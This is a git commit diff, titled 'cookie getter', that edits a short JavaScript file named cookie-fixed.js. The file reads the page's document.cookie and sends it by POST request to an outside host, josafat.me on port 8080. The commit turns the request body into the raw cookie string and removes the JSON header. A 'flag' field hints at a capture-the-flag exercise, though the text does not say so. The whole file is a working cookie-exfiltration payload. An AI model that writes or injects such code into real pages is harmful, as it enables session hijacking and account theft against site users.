1f9dbba2a31085cbb9f9b8aa4a2eb52bf34f8370
Michael Bryan Chandra <ML23-1@slc.net>
2024-02-28 19:05:51 +0700

    cookie getter

--- cookie-fixed.js
+++ cookie-fixed.js
@@ -1,11 +1,8 @@
 console.log(document.cookie);
 async function SendCookie() {
   const response = await fetch("http://josafat.me:8080", {
-    body: { flag: document.cookie },
+    body: `${document.cookie}`,
     method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
   });
 }
 
